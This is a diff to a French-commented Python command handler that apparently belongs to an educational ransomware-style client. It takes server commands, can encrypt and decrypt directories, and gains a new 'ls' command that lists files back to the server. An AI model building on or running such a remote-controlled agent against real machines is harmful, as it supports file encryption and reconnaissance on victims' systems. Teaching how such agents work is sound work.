@@ -16,6 +16,7 @@ Chaque commande renvoie une réponse JSON au serveur.
 from typing import Dict, Any
 from pathlib import Path
 from system import encrypt_directory, decrypt_directory
+import os
 
 
 def handle_command(command: Dict[str, Any], key: str) -> Dict[str, Any]:
@@ -70,6 +71,22 @@ def handle_command(command: Dict[str, Any], key: str) -> Dict[str, Any]:
         }
 
     # ------------------------------------------------------------
-    # 4) Commande inconnue
+    # 4) Commande pédagogique : ls
+    # ------------------------------------------------------------
+    if ctype == "ls":
+        try:
+            files = os.listdir(".")
+            return {
+                "type": "ls_result",
+                "files": files
+            }
+        except Exception as e:
+            return {
+                "type": "ls_result",
+                "error": str(e)
+            }
+
+    # ------------------------------------------------------------
+    # 5) Commande inconnue
     # ------------------------------------------------------------
     return {"error": f"Commande inconnue : {ctype}"}
